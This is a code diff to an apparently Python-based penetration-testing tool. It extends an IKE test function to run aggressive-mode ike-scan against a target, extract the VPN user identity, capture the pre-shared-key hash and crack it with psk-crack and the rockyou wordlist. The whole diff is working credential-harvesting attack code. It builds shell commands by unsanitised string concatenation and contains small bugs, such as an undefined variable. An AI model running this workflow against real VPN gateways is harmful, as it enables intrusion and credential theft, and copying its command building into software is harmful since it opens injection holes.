@@ -36,6 +36,7 @@ import paramiko
 import linecache
 import itertools
 
+from pathlib import Path
 from termcolor import colored
 from collections import OrderedDict
 from impacket.dcerpc.v5 import transport
@@ -453,10 +454,32 @@ def squidCheck():
    
 # IKER TEST
 def iker(TIP):
-   TTIP = TIP.rstrip(" ")
    localCOM("echo 'IKE SCAN PORT 500' > ike.tmp")
-   remoteCOM("ike-scan -M " + TTIP + " >> ike.tmp")
-   catsFile("ike.tmp")
+   remoteCOM("ike-scan -M " + TIP.rstrip(" ") + " >> ike.tmp")
+   if DOM[:5] != "EMPTY":
+        remoteCOM("ike-scan -A " + TIP.rstrip(" ") + " >> ike.tmp")
+        catsFile("ike.tmp")
+        text = Path("ike.tmp").read_text(errors='ignore')
+        m = re.search(r'ID\(Type=ID_USER_FQDN,\s*Value=([^)]+)\)', text)
+        if not m:
+           return None
+        value = m.group(1).strip()
+        if '@' in value:
+           user, domain = value.split('@', 1)
+        else:
+           user, domain = value, None
+        CAP = {'full': value, 'user': user, 'domain': domain}
+        if CAP:
+           print('Full Value:', CAP['full'])
+           print('User:', CAP['user'])
+           print('Domain:', CAP['domain'])
+        else:
+           print('No ID_USER_FQDN found in', path) 
+        localCOM("echo '" + Green + "'")   
+        remoteCOM("sudo ike-scan -A " + TIP.rstrip(" ") + " --id=" + CAP['user'] + "@" + DOM.rstrip(" ") + " -Pike.psk") 
+        localCOM("echo '" + Reset + "'")
+        localCOM("psk-crack -d /usr/share/wordlists/rockyou.txt ike.psk >> crack.tmp")
+        catsFile("crack.tmp")                 
    return  
    
 # GET REMOTE BIOS INFORMATION
